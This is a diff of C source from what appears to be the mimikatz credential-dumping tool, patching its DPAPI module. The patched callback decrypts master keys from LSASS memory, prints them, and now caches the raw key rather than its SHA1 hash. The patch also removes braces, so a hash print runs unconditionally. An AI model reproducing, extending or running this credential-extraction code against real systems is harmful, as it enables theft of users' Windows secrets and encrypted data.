@@ -1,5 +1,5 @@
 /*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
+	https://blog.gentilkiwi.com
 	benjamin@gentilkiwi.com
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
@@ -83,11 +83,9 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_dpapi(IN PKIWI_BASIC_SECURITY_LOGON_
 								{
 									(*pData->lsassLocalHelper->pLsaUnprotectMemory)(aKey.address, mesCredentials.keySize);
 									kprintf(L"\n\t * MasterKey :\t"); kull_m_string_wprintf_hex(aKey.address, mesCredentials.keySize, 0);
+									kuhl_m_dpapi_oe_masterkey_add(&mesCredentials.KeyUid, aKey.address, mesCredentials.keySize);
 									if(kull_m_crypto_hash(CALG_SHA1, aKey.address, mesCredentials.keySize, dgst, SHA_DIGEST_LENGTH))
-									{
 										kprintf(L"\n\t * sha1(key) :\t"); kull_m_string_wprintf_hex(dgst, SHA_DIGEST_LENGTH, 0);
-										kuhl_m_dpapi_oe_masterkey_add(&mesCredentials.KeyUid, dgst, SHA_DIGEST_LENGTH);
-									}
 								}
 								LocalFree(aKey.address);
 							}
